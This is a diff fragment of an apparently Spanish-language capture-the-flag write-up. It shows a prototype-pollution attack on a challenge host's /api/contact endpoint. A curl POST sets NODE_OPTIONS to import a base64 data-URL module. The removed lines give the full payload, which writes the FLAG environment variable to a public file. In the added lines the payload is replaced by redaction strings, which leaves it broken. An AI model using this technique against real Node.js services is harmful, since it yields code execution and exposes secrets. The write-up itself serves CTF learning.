@@ -62,14 +62,14 @@ writeFileSync("/app/public/flag_esm.txt", process.env.FLAG || "NO_FLAG");
 **Base64:**
 
 ```
-aW1wb3J0e3dyaXRlRmlsZVN5bmN9ZnJvbSJmcyI7d3JpdGVGaWxlU3luYygiL2FwcC9wdWJsaWMvZmxhZ19lc20udHh0Iixwcm9jZXNzLmVudi5GTEFHfHwiTk9fRkxBRyIp
+SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYTk9fRkxBRyIp
 ```
 
 ### Paso 1: Contaminar NODE_OPTIONS
 
 ```bash
 curl -X POST -H 'Content-Type: application/json' \
-  -d '{"config": {"constructor.prototype.NODE_OPTIONS": "--import data:text/javascript;base64,aW1wb3J0e3dyaXRlRmlsZVN5bmN9ZnJvbSJmcyI7d3JpdGVGaWxlU3luYygiL2FwcC9wdWJsaWMvZmxhZ19lc20udHh0Iixwcm9jZXNzLmVudi5GTEFHfHwiTk9fRkxBRyIp"}}' \
+  -d '{"config": {"constructor.prototype.NODE_OPTIONS": "--import data:text/javascript;base64,SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYTk9fRkxBRyIp"}}' \
   https://dd89b68620f4d475.chal.ctf.ae/api/contact
 ```
 
